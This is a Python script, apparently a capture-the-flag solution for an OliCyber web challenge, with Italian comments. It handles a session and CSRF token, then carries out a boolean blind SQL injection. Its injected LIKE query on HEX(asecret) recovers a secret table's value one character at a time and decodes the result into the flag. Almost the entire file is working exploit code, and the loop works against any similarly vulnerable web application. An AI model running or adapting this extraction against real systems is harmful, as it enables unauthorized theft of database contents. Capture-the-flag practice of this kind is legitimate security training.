import requests
import binascii
import time

# ==============================================================================
# CLASSE FORNITA DA OLICYBER (Gestione Sessione e Token CSRF)
# ==============================================================================
class Inj:
    def __init__(self, host):
        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result']

# ==============================================================================
# SCRIPT DI ATTACCO BLIND SQLi
# ==============================================================================

# Inizializziamo l'oggetto puntando al server della challenge
inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

print("[*] Connessione stabilita. Token Anti-CSRF ottenuto.")
print("[*] Avvio attacco Blind SQLi in corso. Attendi...\n")

while True:
    trovato = False
    for c in dictionary:
        # Costruiamo la query per indovinare il prossimo carattere esadecimale
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        
        # Interroghiamo l'endpoint 'blind' tramite la classe Inj
        response, error = inj.blind(question)
        
        # Se il server risponde 'Success', la lettera è corretta
        if response == 'Success':
            result += c
            print(f"[+] Trovato: {c} -> HEX parziale: {result}")
            trovato = True
            break
            
    # Se finiamo il dizionario senza trovare nulla, l'estrazione è completata
    if not trovato:
        break

print("\n[*] Estrazione HEX terminata:", result)

# Conversione da HEX ad ASCII (testo leggibile)
if result:
    try:
        flag = bytes.fromhex(result).decode('ascii')
        print("\n" + "="*40)
        print(f"[!] FLAG DECIFRATA: {flag}")
        print("="*40)
    except Exception as e:
        print(f"[-] Errore nella conversione ASCII: {e}")
else:
    print("[-] Estrazione fallita. Nessun carattere trovato.")